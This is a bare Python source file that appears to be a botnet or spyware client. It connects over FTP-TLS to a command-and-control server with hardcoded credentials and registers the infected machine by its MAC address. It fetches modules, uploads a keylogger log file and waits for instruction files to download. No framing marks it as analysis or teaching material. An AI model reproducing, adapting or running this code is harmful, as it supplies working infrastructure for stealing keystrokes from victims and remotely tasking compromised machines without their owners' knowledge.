import os
import subprocess
import urllib
from ftplib import FTP_TLS
from uuid import getnode as get_mac

ip = "192.168.2.55"
user_name = "client_cnc"
password = "q1w2e3r4"

def download(filename):
    local_filename = filename
    lf = open(local_filename, 'wb')
    ftps.retrbinary('RETR %s' % filename, lf.write)
    lf.close()
    return 1

def upload(filename):
    myfile = open(filename, 'r')
    ftps.storlines('STOR %s' % filename, myfile)
    myfile.close()
    return 1

def registration():
    mac = get_mac()
    registration_file = "registration.conf"
    rf = open(registration_file, 'wb')
    rf.write(str(mac))
    rf.close()
    ftps.mkd('%s' % mac)
    return 1   

def check_dir_on_ftp(namedir):
    filelist = []
    ftps.retrlines('LIST',filelist.append)  
    f = 0
    fl = 0
    for f in filelist:
        if namedir in f:
            f = 1
            fl = 1
    return fl

def check_file(namefile):
    if os.path.isfile(namefile):
        return 1
    else:
        return 0

def get_client_name():
    registration_file = "registration.conf"
    rf = open(registration_file, 'r')
    myname = rf.readline()
    rf.close()
    return myname

def check_first_connection():
    registration_file = "registration.conf"
    fl = 0
    check = check_file(registration_file)
    if check == 1:
        rf = open(registration_file, 'r')
        home_dir = rf.readline()
        rf.close()
        flag = check_dir_on_ftp(home_dir)
        if flag == 0:
            registration()
            fl = 1
        if flag == 1:
            fl = 1
    if check == 0:
        mac = get_mac()
        flag = check_dir_on_ftp(str(mac))
        if flag == 0:
            registration()
            check_or_download_modules()
            fl = 1
        if flag == 1:
            registration_file = "registration.conf"
            rf = open(registration_file, 'wb')
            rf.write(str(mac))
            rf.close()
            fl = 1
    return fl

def check_or_download_modules():
    ftps.cwd("/modules/")
    fl1 = check_file("1.txt")
    if fl1 == 0:
        download("1.txt")
    fl2 = check_file("2.txt")
    if fl2 == 0:
        download("2.txt")
    fl3 = check_file("3.txt")
    if fl3 == 0:
        download("3.txt")
    ftps.cwd("/")

def upload_logs_on_server(my_name):
    ftps.cwd('/' + my_name)
    check = check_dir_on_ftp("logs")
    if check == 0:
        ftps.mkd('/' + my_name + '/logs/')
    ftps.cwd('/' + my_name + '/logs/')
    upload('KeyloggerLog.txt')
    ftps.cwd("/")

def download_instruction(my_name):
    ftps.cwd('/' + my_name)
    check = 0
    fl1 = 0
    fl2 = 0
    fl3 = 0
    while check == 0:
        check = check_dir_on_ftp("instructions")
    ftps.cwd('/' + my_name + '/instructions/')
    while fl1 == 0:
        fl1 = check_dir_on_ftp("IK.txt")
    download("IK.txt")
    while fl2 == 0:
        fl2 = check_dir_on_ftp("IG.txt")
    download("IG.txt")
    while fl3 == 0:
        fl3 = check_dir_on_ftp("IS.txt")
    download("IS.txt")  
    ftps.cwd("/")
    return 1

def start_module(name_module):
    PIPE = subprocess.PIPE
    p = subprocess.Popen([name_module, r'/?'], stdout=subprocess.PIPE)
    return 1

ftps= FTP_TLS(ip)
ftps.login(user_name, password)
ftps.prot_p()
check = check_first_connection()
check_or_download_modules()
my_name = get_client_name()
upload_logs_on_server(my_name)
download_instruction(my_name)
ftps.quit()